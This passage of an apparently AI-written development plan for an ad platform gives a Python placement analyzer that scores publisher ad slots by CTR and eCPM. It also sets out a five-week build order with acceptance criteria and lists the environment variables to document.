## PHASE 6 — Auto-analysis of ad placement on publisher sites

You asked for "auto analysis system to portray our ads in publishers' websites". Build the analyzer that tells you (and publishers) which placements actually perform:

```python
# new file backend/liteads/ad_server/services/placement_analyzer.py
# Runs nightly. For every (publisher, slot): pull PublisherDailyStat rows,
# compute CTR + eCPM trend, compare against platform median, then classify.

async def analyze_placements(session) -> list[dict]:
    rows = await session.execute(select(PublisherDailyStat).order_by(PublisherDailyStat.stat_date))
    by_slot = group_by_slot(rows.scalars().all())
    out = []
    for slot_id, stats in by_slot.items():
        ctr = sum(s.clicks for s in stats) / max(1, sum(s.impressions for s in stats))
        ecpm = (sum(float(s.earnings) for s in stats) / max(1, sum(s.impressions for s in stats))) * 1000
        out.append({
            "slot_id": slot_id,
            "ctr": round(ctr, 4),
            "ecpm": round(ecpm, 2),
            "verdict": ("great" if ctr > 0.01 else
                        "low_visibility" if ctr < 0.002 else
                        "healthy"),
            "recommendation": (
                "Raise floor price — demand exceeds supply" if ctr > 0.02 else
                "Move slot above the fold or widen it" if ctr < 0.002 else
                "No action"
            ),
        })
    return out
```

Surface results as: (a) a "Placement Health" table in the publisher dashboard, (b) an input to Phase 2's optimiser — laya's `shift` actions can prefer slots with `verdict == "great"`, (c) weekly email to publishers with their top/bottom slots.

---

# PART 5 — BUILD ORDER (freshers: do not reorder)

1. **Days 1–3:** Phase 1 (BUG-1 to BUG-6). Finance auth first. Nothing else matters until this is merged.
2. **Days 4–7:** Phase 4.1 + 4.2 (email verification delivery, domain verification). Also run the email-verification gate.
3. **Week 2:** Phase 3 (chat builder + Razorpay QR + webhook). Test with Razorpay test mode; verify webhook signature rejection with a tampered payload.
4. **Week 3:** Phase 2 (laya sidecar + optimiser + Suggestions UI + Autopilot toggle). Keep Autopilot default OFF.
5. **Week 4:** Phase 4.3 (creative auto-review) + Phase 6 (placement analyzer).
6. **Week 5:** Phase 5 partner pack + sandbox publisher account + end-to-end demo: chat → QR → pay → launch → ad served on a test site → impression billed → webhook fired → suggestion generated.

**Definition of done for Phase 2:** a campaign on autopilot stays inside guardrails for 72 hours without human touch; a stranger cannot hit `/finance/*` without a token; the same tracking URL fired twice is rejected; a creative containing a blocked pattern never reaches ACTIVE; a publisher's unverified property never serves an ad; an advertiser in India can type "new campaign → budget 2000 → developers in Mumbai → add ₹500" and be live in under 5 minutes. If any of those fail, the phase is not done.

**New env vars to document in your `.env.example`:**
```
RAZORPAY_KEY_ID / RAZORPAY_KEY_SECRET / RAZORPAY_WEBHOOK_SECRET
RESEND_API_KEY            (or SES equivalent)
LAYA_BASE_URL=http://laya:8000
```

**Honest note on laya:** it is a small typed-decision model with an HTTP serving layer (`serve.py`), exactly the right shape for guardrailed automation. Where I could not verify an exact endpoint name (marked `TODO(confirm)` in `laya_client.py`), your devs must check `laya/docs/http-api.md` and adjust one string. Everything else is written against your verified codebase.
